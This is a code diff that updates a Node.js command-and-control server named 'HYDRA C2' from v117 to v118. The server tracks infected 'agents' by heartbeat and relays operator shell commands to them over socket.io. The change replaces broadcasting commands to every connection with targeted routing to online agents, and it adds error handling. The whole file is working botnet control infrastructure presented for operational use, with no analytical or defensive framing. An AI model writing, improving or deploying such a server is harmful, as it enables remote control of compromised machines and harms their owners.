@@ -1,5 +1,5 @@
 // TYPE: NODE.JS C2 SERVER (RUN ON RENDER)
-// NK HYDRA v117.0 [BROADCAST + HEARTBEAT]
+// NK HYDRA v118.0 [STABLE ROUTING]
 
 const express = require('express');
 const http = require('http');
@@ -9,7 +9,7 @@ const cors = require('cors');
 const app = express();
 app.use(cors());
 
-app.get('/', (req, res) => { res.send('HYDRA C2 v117.0 [ACTIVE]'); });
+app.get('/', (req, res) => { res.send('HYDRA C2 v118.0 [STABLE]'); });
 
 const server = http.createServer(app);
 const io = new Server(server, { 
@@ -49,34 +49,46 @@ io.on('connection', (socket) => {
         io.to('ui_room').emit('agents_list', agents);
     });
 
-    // KEEP ALIVE HANDLER
     socket.on('heartbeat', (data) => {
         const agent = agents.find(a => a.id === data.id);
         if (agent) {
             agent.lastSeen = Date.now();
             agent.status = 'Online';
-            // Only emit list update if status changed effectively
-            // io.to('ui_room').emit('agents_list', agents); 
         }
     });
 
     socket.on('exec_cmd', (data) => {
-        const { targetId, cmd } = data;
-        console.log(`[CMD] ${cmd} -> ${targetId}`);
-        
-        io.to('ui_room').emit('agent_event', { type: 'INFO', agentId: 'C2', payload: `TX: ${cmd}` });
+        try {
+            const { targetId, cmd } = data;
+            console.log(`[CMD] ${cmd} -> ${targetId}`);
+            
+            // Log to UI
+            io.to('ui_room').emit('agent_event', { type: 'INFO', agentId: 'C2', payload: `TX: ${cmd}` });
 
-        // v117: BROADCAST FALLBACK
-        // If target is 'all' OR we want to guarantee delivery, we broadcast.
-        io.emit('exec_cmd', { cmd }); 
+            // v118: TARGETED ROUTING (Prevents Broadcast Crash Loop)
+            if (targetId === 'all') {
+                agents.forEach(agent => {
+                    if (agent.status === 'Online' && agent.socketId) {
+                        io.to(agent.socketId).emit('exec_cmd', { cmd });
+                    }
+                });
+            } else {
+                const target = agents.find(a => a.id === targetId);
+                if (target && target.status === 'Online') {
+                    io.to(target.socketId).emit('exec_cmd', { cmd });
+                }
+            }
+        } catch (e) {
+            console.error("Exec Error:", e);
+        }
     });
     
     socket.on('agent_event', (data) => {
+        // Relay agent events to UI
         io.to('ui_room').emit('agent_event', data);
     });
 
-    socket.on('disconnect', (reason) => {
-        console.log(`[!] Disconnect: ${socket.id} (${reason})`);
+    socket.on('disconnect', () => {
         const agent = agents.find(a => a.socketId === socket.id);
         if (agent) { 
             agent.status = 'Offline'; 
@@ -86,4 +98,5 @@ io.on('connection', (socket) => {
 });
 
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => console.log(`HYDRA v117 LISTENING ON ${PORT}`));
+server.listen(PORT, () => console.log(`HYDRA v118 LISTENING ON ${PORT}`));
+
